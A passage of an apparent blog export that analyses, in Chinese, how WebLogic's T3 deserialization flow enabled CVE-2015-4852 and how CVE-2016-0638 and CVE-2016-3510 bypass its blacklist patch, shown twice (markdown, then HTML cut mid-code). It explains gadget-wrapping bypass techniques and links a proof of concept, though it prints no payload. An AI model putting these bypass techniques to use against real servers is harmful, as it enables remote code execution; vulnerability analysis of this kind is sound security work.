}\n```\n\n从readClassDesc方法的实现可见，readClassDesc中switch语句有5个分支（TC_NULL、TC_REFERENCE、TC_PROXYCLASSDESC、TC_CLASSDESC、default）。\n\n```\nTC_NULL描述符表示空对象引用\n\nTC_REFERENCE描述符表示引用已写入流的对象\n\nTC_PROXYCLASSDESC是新的代理类描述符\n\nTC_CLASSDESC是新的类描述符\n```\n\n那么我们为什么在上文流程图里只画出了其中两处分支（TC_PROXYCLASSDESC、TC_CLASSDESC）呢？\n\n我们先来看看Weblogic反序列化漏洞成的原理：Weblogic反序列化漏洞是由于通过流量中传入的恶意类而未得到合理的过滤，最终被反序列化而形成。\n\n从原理上来看，是weblogic对流量中序列化后的类对象处理时出现的问题。\n\n基于这一点，我们应重点关注程序是如何从流量中获取并处理类类型数据的流程。\n\nTC_PROXYCLASSDESC与TC_CLASSDESC描述符标识了流量中代理类与类这两种类型的数据，因此我们重点关注TC_PROXYCLASSDESC与TC_CLASSDESC这两处分支，这也是上文流程图里只有这两处分支的原因。\n\n当readClassDesc从字节流中读取到TC_CLASSDESC描述符，说明此处程序此时要处理的字节流为普通类，程序接下来会调用readNonProxyDesc方法对这段字节流进行解析。\n\n在readNonProxyDesc方法中，程序会从该段序列化流中获取类的序列化描述符ObjectStreamClass（类序列化描述符ObjectStreamClass，其本质是对Class类的包装，可以想象成一个字典，里面记录了类序列化时的一些信息，包括字段的描述信息和serialVersionUID 和需要序列化的字段fields，以便在反序列化时拿出来使用）。随后该类的序列化描述符被传递给resolveClass方法，resolveClass方法从该类的序列化描述符中获取对应的Class对象。\n\n![6f8788495652b7967dbc4b94b7452790.png](https://xzfile.aliyuncs.com/media/upload/picture/20201027155508-bbe2ab14-1829-1.png)\n\n当readClassDesc从字节流中读取到TC_PROXYCLASSDESC描述符时，说明此处程序此时要处理的字节流为动态代理类，程序接下来会调用readProxyDesc方法进行处理，过程与上文一致，不再复述。\n\n我们以此处传入的字节流为普通类为例，接下来看看resolveClass是如何将类的序列化描述符加工成该类的Class对象\n\n位于weblogic/rjvm/InboundMsgAbbrev.class中的resolveClass方法\n\n```java\n        protected Class resolveClass(ObjectStreamClass var1) throws ClassNotFoundException, IOException {\n            Class var2 = super.resolveClass(var1);\n            if (var2 == null) {\n                throw new ClassNotFoundException(\"super.resolveClass returns null.\");\n            } else {\n                ObjectStreamClass var3 = ObjectStreamClass.lookup(var2);\n                if (var3 != null && var3.getSerialVersionUID() != var1.getSerialVersionUID()) {\n                    throw new ClassNotFoundException(\"different serialVersionUID. local: \" + var3.getSerialVersionUID() + \" remote: \" + var1.getSerialVersionUID());\n                } else {\n                    return var2;\n                }\n            }\n        }\n```\n\n程序通过Class var2 = super.resolveClass(var1); 从ObjectStreamClass var1中获取到对应的类对象，并赋值给var2，最终通过执行return var2，将var1序列化描述符所对应的Class对象返回\n\n我们以熟悉的CVE-2015-4852利用链为例，动态调试一下resolveClass方法\n\n![b35be97a6451bd74a8868173bdd629d0.png](https://xzfile.aliyuncs.com/media/upload/picture/20201027155521-c3a488ae-1829-1.png)\n\n可见resolveClass方法成功从序列化描述符中获取到”sun.reflect.annotation.AnnotationInvocationHandler”类对象，并将其返回\n\n到目前为止，我们已经搞明白了weblogic如何将流量中的类字节流转变为对应的Class对象。以上这部分知识，有助于我们理解Weblogic官方的修复方案。而接下来我们要谈论的是在Weblogic获得到Class对象后要做的事情，通过对这部分流程的理解，将会帮助你很轻松的理解为什么CVE-2015-4852、CVE-2016-0638、CVE-2016-3510的poc是如何奏效的。\n\n从Class对象到代码执行\n---------------------\n\n通过上文的介绍可知，程序通过resolveClass获取Class对象，在resolveClass方法将获取到的Class对象返回后，上一级的readNonProxyDesc在接收到resolveClass方法返回值后，连同之前从流量中获取类的序列化描述符ObjectStreamClass一并，初始化并构建一个新的ObjectStreamClass，这个流程如下：\n\n![image-20201029110755721](https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/image-20201029110755721.png)\n\n关键部分代码如下\n\n```java\nprivate ObjectStreamClass readNonProxyDesc(boolean unshared) \nthrows IOException \n   {\n...\n\nObjectStreamClass desc = new ObjectStreamClass();\n...\n\nObjectStreamClass readDesc = null;\n...\n    readDesc = readClassDescriptor();\n...\n\nClass cl = null;\n...\n    if ((cl = resolveClass(readDesc)) == null) {\n   resolveEx = new ClassNotFoundException(\"null class\");\n    }\n...\ndesc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(false));\n\n...\nreturn desc;\n   }\n```\n\n结合流程图与代码来看，readNonProxyDesc方法中主要做了如下这些事情\n\n1、通过readClassDescriptor()方法从流量中获取序列化类的ObjectStreamClass并赋值给readDesc变量\n\n2、将readDesc传入resolveClass，获取该类的Class对象并赋值给cl变量\n\n3、将该类的ObjectStreamClass与Class对象传入initNonProxy方法，初始化一个ObjectStreamClass并赋值给desc变量\n\n4、将desc变量返回\n\n\n\nreadNonProxyDesc方法中返回的ObjectStreamClass类型的desc变量，将会传递给readClassDesc，进而被readClassDesc传递给readOrdinaryObject\n\nreadOrdinaryObject、readClassDesc与readNonProxyDesc的调用关系如下：\n\n\n\nreadOrdinaryObject中调用readClassDesc:\n\n```java\nprivate Object readOrdinaryObject(boolean unshared) \nthrows IOException \n   {\n...\n\nObjectStreamClass desc = readClassDesc(false);\n...\n```\n\n\n\nreadClassDesc中调用readNonProxyDesc:\n\n```java\nprivate ObjectStreamClass readClassDesc(boolean unshared) \nthrows IOException \n   {\nbyte tc = bin.peekByte();\nswitch (tc) {\n...\n    case TC_CLASSDESC:\n   return readNonProxyDesc(unshared);\n```\n\n\n\n因此，当readNonProxyDesc中ObjectStreamClass类型的desc变量返回后，途径readClassDesc方法的最终传递给readOrdinaryObject中的desc变量\n\n接下来看看readOrdinaryObject方法中部分片段\n\n```java\nObjectStreamClass desc = readClassDesc(false);\n...\n    obj = desc.isInstantiable() ? desc.newInstance() : null;\n...\nif (desc.isExternalizable()) {\n    readExternalData((Externalizable) obj, desc);\n} else {\n    readSerialData(obj, desc);\n}\n\nhandles.finish(passHandle);\n\nif (obj != null && \n    handles.lookupException(passHandle) == null &&\n    desc.hasReadResolveMethod())\n{\n    Object rep = desc.invokeReadResolve(obj);\n```\n\n上述代码中的第一行：\n\n```java\nObjectStreamClass desc = readClassDesc(false);\n```\n\n代码中由readClassDesc(false)执行得到的desc，即是readNonProxyDesc中获取并返回的ObjectStreamClass类型的desc\n\n```java\nobj = desc.isInstantiable() ? desc.newInstance() : null;\n```\n\n代码中接下来的条件分支，即是在获取了ObjectStreamClass类型的desc后，readOrdinaryObject接着尝试调用类对象中的readObject、readResolve、readExternal等方法。\n\n关于readObject、readResolve、readExternal等方法的调用，将其整理成流程图，有助于对其更好的理解，流程图如下：\n\n![54e51374e255a9c4b137acc1d0cbd56c.png](https://xzfile.aliyuncs.com/media/upload/picture/20201027155537-cca7961c-1829-1.png)\n\n在Weblogic从流量中的序列化类字节段通过readClassDesc-readNonProxyDesc-resolveClass获取到普通类序列化数据的类对象后，程序依次尝试调用类对象中的readObject、readResolve、readExternal等方法。\n\n在这里提前透露下，CVE-2015-4852、CVE-2016-0638、CVE-2016-3510这三个漏洞，所利用的恰好依次是恶意类”sun.reflect.annotation.AnnotationInvocationHandler”中的readObject、”weblogic.jms.common.StreamMessageImpl”中的readExternal、以及”weblogic.corba.utils.MarshalledObject”中的readResolve方法\n\n试想一下这个场景：在没有任何防护或防护不当的时候，攻击者通过流量中传入恶意类的序列化数据，weblogic将流量中的序列化数据还原为其对应的Class对象，并尝试执行恶意类中的readObject、readResolve、readExternal等方法。这就是CVE-2015-4852、CVE-2016-0638、CVE-2016-3510漏洞的核心。\n\nCVE-2015-4852\n-------------\n\n在分析过流程之后，这个漏洞呼之欲出。简单来说，在CVE-2015-4852漏洞爆发之前，weblogic对流量中的序列化数据没有任何的校验，长驱直入的恶意数据最终被还原出其Class对象，并被Weblogic调用了其Class对象中的readObject方法，结合CVE-2015-4852细节来说就是：\n\n1.  精心构造的ChainedTransformer恶意链（以下简称恶意数据）\n\n2.  将构造好的恶意数据包裹在AnnotationInvocationHandler类的memberValues变量中\n\n3.  在流量中构造并传入上述制作好的AnnotationInvocationHandler类的序列化数据\n\n4.  Weblogic获取AnnotationInvocationHandler类的Class对象\n\n5.  Weblogic尝试调用AnnotationInvocationHandler类的readObject方法\n\n6.  AnnotationInvocationHandler类中readObject中存在一些有助于漏洞利用的操作（AnnotationInvocationHandler的readObject方法中对其memberValues的每一项调用了setValue方法进而调用了checkSetValue）\n\n7.  恶意数据存放在memberValues中伺机而动。恶意数据的原理我们就不细说了，简单来说就是，当恶意数据的checkSetValue被触发，就能造成命令执行\n\n8.  等到readObject方法对memberValues的每一项调用setValue方法执行时，setValue方法会进而调用并触发恶意数据的checkSetValue，造成命令执行\n\n![e92fbde69bafb5ac777da44e96bd9d9a.png](https://xzfile.aliyuncs.com/media/upload/picture/20201027155550-d4cf730a-1829-1.png)\n\nWeblogic的防护机制\n------------------\n\nCVE-2015-4852这个漏洞利用出现之后，官方对Weblogic进行了一些改造，增加了一些安全防护。至于怎么防护，说起来很简单，以普通类为例，见下图：\n\n![10b6817babd9d985caefe76cc0623ac0.png](https://xzfile.aliyuncs.com/media/upload/picture/20201027155559-da0eb3b2-1829-1.png)\n\nresolveClass方法的作用是从类序列化描述符获取类的Class对象，在resolveClass中增加一个检查，检查一下该类的序列化描述符中记录的类名是否在黑名单上，如果在黑名单上，直接抛出错误，不允许获取恶意的类的Class对象。这样以来，恶意类连生成Class对象的机会都没有，更何况要执行恶意类中的\nreadObject、readResolve、readExternal呢。\n\n我们看一下具体是怎么实现的，见下图：\n\n![b95c0a9e24b511213e076e61a069e12f.png](https://xzfile.aliyuncs.com/media/upload/picture/20201027155626-e9e7005a-1829-1.png)\n\n可见更新之后多出了一个if条件分支，通过isBlackListed校验传入的类名用来处理代理类的resolveProxyClass也是一样的方式，不再复述。\n\n从整体上来看，检查模块主要在下图红框里\n\n![898634e47e18bace15c0cbba196c9b31.png](https://xzfile.aliyuncs.com/media/upload/picture/20201027155635-ef801b3c-1829-1.png)\n\n在修复过后，CVE-2015-4852已经不能成功利用了：CVE-2015-4852所使用到的AnnotationInvocationHandler在黑名单中，会直接报错而不能获取其Class对象，更不能执行其中的readObject。\n\nCVE-2016-0638\n-------------\n\n这个漏洞主要是找到了个黑名单之外的类\"weblogic.jms.common.StreamMessageImpl\"\n\n简单来说，由于黑名单的限制，CVE-2015-4852利用链没法直接使用，这个漏洞像是整了个套娃，给CVE-2015-4852装进去了。\n\n为什么使用StreamMessageImpl这个类呢？其实原理也很简单。StreamMessageImpl类中的readExternal方法可以接收序列化数据作为参数，而当StreamMessageImpl类的readExternal执行时，会反序列化传入的参数并执行该参数反序列化后对应类的readObject方法。我们动态调试一下，见下图\n\n![362088fdc6055340600570c83c08993f.png](https://xzfile.aliyuncs.com/media/upload/picture/20201027155645-f52e107a-1829-1.png)\n\n如果我们把序列化后的CVE-2015-4852利用链序列化之后丢进readExternal呢？\n\n当我们给上图StreamMessageImpl类的readExternal中传入序列化后的CVE-2015-4852利用链，在readExternal被执行时，会将CVE-2015-4852利用链数据反序列化，并在上图864行处调用其readObject方法，也就是AnnotationInvocationHandler的readObject方法\n\n好了，AnnotationInvocationHandler的readObject方法被调用了，CVE-2015-4852复活了。\n\n但是StreamMessageImpl类的readExternal要怎么被执行呢?别忘了上文分析的Weblogic反序列化流程，在获取到StreamMessageImpl类的Class对象后，程序可不止调用其readObject方法，还会尝试调用readExternal的。\n\n![9ce6bbce5fae485feaa76654ff515c80.png](https://xzfile.aliyuncs.com/media/upload/picture/20201027155655-fb5f308c-1829-1.png)\n\nCVE-2016-3510\n-------------\n\n这个漏洞与上一个几乎一致，也是做了个套娃给CVE-2015-4852利用链装进去了，从而绕过了黑名单限制。\n\n这次找到的是weblogic.corba.utils.MarshalledObject\n\n首先看一下这个类的构造方法\n\n```java\npublic MarshalledObject(Object var1) throws IOException {\n    if (var1 == null) {\n        this.hash = 13;\n    } else {\n        ByteArrayOutputStream var2 = new ByteArrayOutputStream();\n        MarshalledObject.MarshalledObjectOutputStream var3 = new MarshalledObject.MarshalledObjectOutputStream(var2);\n        var3.writeObject(var1);\n        var3.flush();\n        this.objBytes = var2.toByteArray();\n        int var4 = 0;\n\n        for(int var5 = 0; var5 < this.objBytes.length; ++var5) {\n            var4 = 31 * var4 + this.objBytes[var5];\n        }\n\n        this.hash = var4;\n    }\n}\n```\n\n可以发现，这个类的构造方法接收一个Object类型的参数var1，然后将传入的Object参数序列化后转换为byte数组的形式赋值给this.objBytes\n\n我们接下来看看MarshalledObject的readResolve方法\n\n```java\npublic Object readResolve() throws IOException, ClassNotFoundException, ObjectStreamException {\n    if (this.objBytes == null) {\n        return null;\n    } else {\n        ByteArrayInputStream var1 = new ByteArrayInputStream(this.objBytes);\n        ObjectInputStream var2 = new ObjectInputStream(var1);\n        Object var3 = var2.readObject();\n        var2.close();\n        return var3;\n    }\n}\n```\n\n可见，MarshalledObject的readResolve方法将this.objBytes反序列化，并执行其readObject。this.objBytes可以由MarshalledObject构造方法中传入的var参数控制\n\n![d47f1dff5b0fa0d58f49133ceba48d38.png](https://xzfile.aliyuncs.com/media/upload/picture/20201027155707-028637ca-182a-1.png)\n\n这样以来，将CVE-2015-4852利用链传入MarshalledObject构造方法中，将MarshalledObject序列化后，则可以将CVE-2015-4852利用链保存在其this.objBytes变量中。当weblogic将构造好的MarshalledObject反序列化时，weblogic将尝试调用MarshalledObject的readResolve方法时，CVE-2015-4852利用链被执行\n\n如果对如何构造的poc细节不是很清楚，可以参照这个链接\n\nhttps://github.com/zhzhdoai/Weblogic_Vuln/blob/master/Weblogic_Vuln/src/main/java/com/weblogcVul/CVE_2016_3510.java\n\n\n\n## 总结\n\nWeblogic的前三个反序列化漏洞并不复杂，但是对其的研究和分析是有一定的方式的，仅仅从单一的漏洞分析入手，很容易看不懂，反而把漏洞弄得复杂化。在了解了漏洞流程之后，再回头来看，这几个漏洞的原理便呼之欲出。","slug":"weblogic-CVE-2015-4852-CVE-2016-0638-CVE-2016-3510","published":1,"updated":"2020-10-29T07:33:52.650Z","_id":"ckgrozuam006lwsa99qir9cj9","comments":1,"layout":"post","photos":[],"link":"","content":"<p>目前。网上关于CVE-2015-4852漏洞的资料很多，但是针对CVE-2015-4852漏洞如何修复，修复补丁又是如何生效的却少之又少；而CVE-2016-0638、CVE-2016-3510这两个漏洞又是如何绕过CVE-2015-4852补丁的，则只是在介绍Weblogic系列漏洞时被一句话带过。</p>\n<p>CVE-2015-4852、CVE-2016-0638以及CVE-2016-3510，这三个漏洞有着极其相似的地方，其本质就是利用了Weblogic反序列化机制，而官方在修复CVE-2015-4852时，也并未对这个机制进行调整，而仅仅是在此基础上增加了一个关卡：黑名单。</p>\n<p>因此，在彻底搞清楚Weblogic反序列化漏洞的原理以及如何修复这个问题之前，很有必要弄清楚Weblogic处理流量中的java反序列化数据的流程。只有清楚了这一点，才能很好的理解如下几个问题：</p>\n<ol>\n<li><p>CVE-2015-4852是如何产生的以及后续是如何修复的？</p>\n</li>\n<li><p>修复CVE-2015-4852，为何要在resolveClass:108,InboundMsgAbbrev$ServerChannelInputStream (weblogic.rjvm)处添加黑名单？</p>\n</li>\n<li><p>CVE-2016-0638、CVE-2016-3510是如何绕过修复？二者的绕过方式有何相同与不同？</p>\n</li>\n</ol>\n<h2 id=\"Weblogic-反序列化攻击时序\"><a href=\"#Weblogic-反序列化攻击时序\" class=\"headerlink\" title=\"Weblogic 反序列化攻击时序\"></a>Weblogic 反序列化攻击时序</h2><p>为了搞清楚CVE-2015-4852、CVE-2016-0638、CVE-2016-3510中的种种疑团，我们需要首先来弄明白一些原理性的东西，我们先从Weblogic<br>反序列化攻击时序入手，看看Weblogic是如何从流量中将序列化字节码进行反序列化。</p>\n<p>首先贴出一张Weblogic 反序列化攻击时序图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201027155439-aa3a40c0-1829-1.png\" alt=\"f165b1f00063791e06a1dbd615604c52.png\"></p>\n<p>这张图是从我的好朋友廖新喜大佬博客扒下来的，也欢迎大家去读一读他的关于java漏洞的分析文章：</p>\n<p><a href=\"http://xxlegend.com/2018/06/20/%E5%85%88%E7%9F%A5%E8%AE%AE%E9%A2%98%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E6%88%98%20%E8%A7%A3%E8%AF%BB/\">http://xxlegend.com/2018/06/20/%E5%85%88%E7%9F%A5%E8%AE%AE%E9%A2%98%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E6%88%98%20%E8%A7%A3%E8%AF%BB/</a></p>\n<p>上图为一张完整的Weblogic反序列化攻击时序图，庞大而且繁杂，不如我们将其拆分开，首先说说Weblogic如何从流量数据取出序列化数据并获取其类对象的过程。</p>\n<h2 id=\"从流量数据到Class对象\"><a href=\"#从流量数据到Class对象\" class=\"headerlink\" title=\"从流量数据到Class对象\"></a>从流量数据到Class对象</h2><p>首先我们来看一张图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201027155452-b1e5a580-1829-1.png\" alt=\"ccd71bc1337e47616a30ed30beaa656c.png\"></p>\n<p>Weblogic通过7001端口，获取到流量中T3协议的java反序列化数据。从上图中readObject开始，经过流程中的一步步的加工，并最终于上图流程终点处的resolveProxyClass或resolveClass处将流量中的代理类/类类型的字节流转变为了对应的Class对象。</p>\n<p>首先我们可以发现：在ObjectInputStream (java.io)中的readClassDesc方法处，存在着分叉点，导致了序列化流量流向了两个不同的分支：其中一些流量流向了readProxyDesc并最终采用resolveProxyClass获取类对象，而另一些则流向了readNonProxyDesc并最终使用resolveClass获取类对象。</p>\n<h3 id=\"readClassDesc是什么？\"><a href=\"#readClassDesc是什么？\" class=\"headerlink\" title=\"readClassDesc是什么？\"></a>readClassDesc是什么？</h3><p>从上文来看，流量数据经过readClassDesc并驶入了不同的处理分支。</p>\n<p>首先来看一下readClassDesc方法的官方注释：“readClassDesc方法读入并返回（可能为null）类描述符。将passHandle设置为类描述符的已分配句柄。”</p>\n<p>如果想理解官方注释的含义，需要扩充一些java序列化的知识：</p>\n<p>java序列化数据在流量传输，并不是随随便便杂乱无章的，序列化数据的格式是要遵循序列化流协议。</p>\n<p>序列化流协议定义了字节流中传输的对象的基本结构。该协议定义了对象的每个属性：其类，其字段以及写入的数据，以及以后由类特定的方法读取的数据。</p>\n<p>字节流中对象的表示可以用一定的语法格式来描述。对于空对象，新对象，类，数组，字符串和对流中已有对象的反向引用，都有特殊的表示形式。比如说在字节流中传递的序列化数据中，字符串有字符串类型的特定格式、对象有对象类型的特定格式、类结构有着类结构。而TC_STRING、TC_OBJECT、TC_CLASSDESC则是他们的描述符，他们标识了接下来这段字节流中的数据是什么类型格式的</p>\n<p>以TC_CLASSDESC为例，TC_CLASSDESC在流量中的值是(byte)0x72，在序列化流协议中，当这个值出现后，代表接下来的数据将开始一段Class的描述(DESC=description)，即TC_CLASSDESC描述符(byte)0x72后面的字节流数据为Class类型。通过这些描述符，程序可以正确的解析流量中的序列化数据。</p>\n<p>如果对这部分感兴趣，可以参照oracle文档：</p>\n<p><a href=\"https://www.oracle.com/security-alerts/cpuoct2020traditional.html\">https://www.oracle.com/security-alerts/cpuoct2020traditional.html</a></p>\n<p>readClassDesc的功能很简单：读入字节流，通过读取字节流中的描述符来确定字节流中传递数据的类型，并交给对应的方法进行处理。</p>\n<p>接下来我们看看readClassDesc的实现</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">private</span> ObjectStreamClass <span class=\"title\">readClassDesc</span><span class=\"params\">(<span class=\"keyword\">boolean</span> unshared)</span> </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">throws</span> IOException </span></span><br><span class=\"line\"><span class=\"function\">   </span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">byte</span> tc = bin.peekByte();</span><br><span class=\"line\"><span class=\"keyword\">switch</span> (tc) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> TC_NULL:</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (ObjectStreamClass) readNull();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">case</span> TC_REFERENCE:</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (ObjectStreamClass) readHandle(unshared);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">case</span> TC_PROXYCLASSDESC:</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> readProxyDesc(unshared);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">case</span> TC_CLASSDESC:</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> readNonProxyDesc(unshared);</span><br><span class=\"line\">\t</span><br><span class=\"line\">    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">\t<span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> StreamCorruptedException(</span><br><span class=\"line\">\t    String.format(<span class=\"string\">&quot;invalid type code: %02X&quot;</span>, tc));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n\n<p>从readClassDesc方法的实现可见，readClassDesc中switch语句有5个分支（TC_NULL、TC_REFERENCE、TC_PROXYCLASSDESC、TC_CLASSDESC、default）。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">TC_NULL描述符表示空对象引用</span><br><span class=\"line\"></span><br><span class=\"line\">TC_REFERENCE描述符表示引用已写入流的对象</span><br><span class=\"line\"></span><br><span class=\"line\">TC_PROXYCLASSDESC是新的代理类描述符</span><br><span class=\"line\"></span><br><span class=\"line\">TC_CLASSDESC是新的类描述符</span><br></pre></td></tr></table></figure>\n\n<p>那么我们为什么在上文流程图里只画出了其中两处分支（TC_PROXYCLASSDESC、TC_CLASSDESC）呢？</p>\n<p>我们先来看看Weblogic反序列化漏洞成的原理：Weblogic反序列化漏洞是由于通过流量中传入的恶意类而未得到合理的过滤，最终被反序列化而形成。</p>\n<p>从原理上来看，是weblogic对流量中序列化后的类对象处理时出现的问题。</p>\n<p>基于这一点，我们应重点关注程序是如何从流量中获取并处理类类型数据的流程。</p>\n<p>TC_PROXYCLASSDESC与TC_CLASSDESC描述符标识了流量中代理类与类这两种类型的数据，因此我们重点关注TC_PROXYCLASSDESC与TC_CLASSDESC这两处分支，这也是上文流程图里只有这两处分支的原因。</p>\n<p>当readClassDesc从字节流中读取到TC_CLASSDESC描述符，说明此处程序此时要处理的字节流为普通类，程序接下来会调用readNonProxyDesc方法对这段字节流进行解析。</p>\n<p>在readNonProxyDesc方法中，程序会从该段序列化流中获取类的序列化描述符ObjectStreamClass（类序列化描述符ObjectStreamClass，其本质是对Class类的包装，可以想象成一个字典，里面记录了类序列化时的一些信息，包括字段的描述信息和serialVersionUID 和需要序列化的字段fields，以便在反序列化时拿出来使用）。随后该类的序列化描述符被传递给resolveClass方法，resolveClass方法从该类的序列化描述符中获取对应的Class对象。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201027155508-bbe2ab14-1829-1.png\" alt=\"6f8788495652b7967dbc4b94b7452790.png\"></p>\n<p>当readClassDesc从字节流中读取到TC_PROXYCLASSDESC描述符时，说明此处程序此时要处理的字节流为动态代理类，程序接下来会调用readProxyDesc方法进行处理，过程与上文一致，不再复述。</p>\n<p>我们以此处传入的字节流为普通类为例，接下来看看resolveClass是如何将类的序列化描述符加工成该类的Class对象</p>\n<p>位于weblogic/rjvm/InboundMsgAbbrev.class中的resolveClass方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">protected</span> Class <span class=\"title\">resolveClass</span><span class=\"params\">(ObjectStreamClass var1)</span> <span class=\"keyword\">throws</span> ClassNotFoundException, IOException </span>&#123;</span><br><span class=\"line\">    Class var2 = <span class=\"keyword\">super</span>.resolveClass(var1);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (var2 == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> ClassNotFoundException(<span class=\"string\">&quot;super.resolveClass returns null.&quot;</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        ObjectStreamClass var3 = ObjectStreamClass.lookup(var2);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (var3 != <span class=\"keyword\">null</span> &amp;&amp; var3.getSerialVersionUID() != var1.getSerialVersionUID()) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> ClassNotFoundException(<span class=\"string\">&quot;different serialVersionUID. local: &quot;</span> + var3.getSerialVersionUID() + <span class=\"string\">&quot; remote: &quot;</span> + var1.getSerialVersionUID());</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> var2;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>程序通过Class var2 = super.resolveClass(var1); 从ObjectStreamClass var1中获取到对应的类对象，并赋值给var2，最终通过执行return var2，将var1序列化描述符所对应的Class对象返回</p>\n<p>我们以熟悉的CVE-2015-4852利用链为例，动态调试一下resolveClass方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201027155521-c3a488ae-1829-1.png\" alt=\"b35be97a6451bd74a8868173bdd629d0.png\"></p>\n<p>可见resolveClass方法成功从序列化描述符中获取到”sun.reflect.annotation.AnnotationInvocationHandler”类对象，并将其返回</p>\n<p>到目前为止，我们已经搞明白了weblogic如何将流量中的类字节流转变为对应的Class对象。以上这部分知识，有助于我们理解Weblogic官方的修复方案。而接下来我们要谈论的是在Weblogic获得到Class对象后要做的事情，通过对这部分流程的理解，将会帮助你很轻松的理解为什么CVE-2015-4852、CVE-2016-0638、CVE-2016-3510的poc是如何奏效的。</p>\n<h2 id=\"从Class对象到代码执行\"><a href=\"#从Class对象到代码执行\" class=\"headerlink\" title=\"从Class对象到代码执行\"></a>从Class对象到代码执行</h2><p>通过上文的介绍可知，程序通过resolveClass获取Class对象，在resolveClass方法将获取到的Class对象返回后，上一级的readNonProxyDesc在接收到resolveClass方法返回值后，连同之前从流量中获取类的序列化描述符ObjectStreamClass一并，初始化并构建一个新的ObjectStreamClass，这个流程如下：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/image-20201029110755721.png\" alt=\"image-20201029110755721\"></p>\n<p>关键部分代码如下</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> ObjectStreamClass <span class=\"title\">readNonProxyDesc</span><span class=\"params\">(<span class=\"keyword\">boolean</span> unshared)</span> </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">throws</span> IOException </span></span><br><span class=\"line\"><span class=\"function\">   </span>&#123;</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">ObjectStreamClass desc = <span class=\"keyword\">new</span> ObjectStreamClass();</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">ObjectStreamClass readDesc = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">...</span><br><span class=\"line\">    readDesc = readClassDescriptor();</span><br><span 